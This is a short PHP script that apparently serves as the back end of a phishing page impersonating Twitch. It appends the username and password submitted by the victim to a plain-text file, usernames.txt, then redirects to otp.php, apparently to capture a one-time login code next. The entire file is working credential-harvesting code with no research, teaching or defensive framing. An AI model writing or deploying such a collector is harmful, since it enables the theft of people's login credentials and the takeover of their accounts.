<?php
file_put_contents("usernames.txt", "Twich Username: " . $_POST['Username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>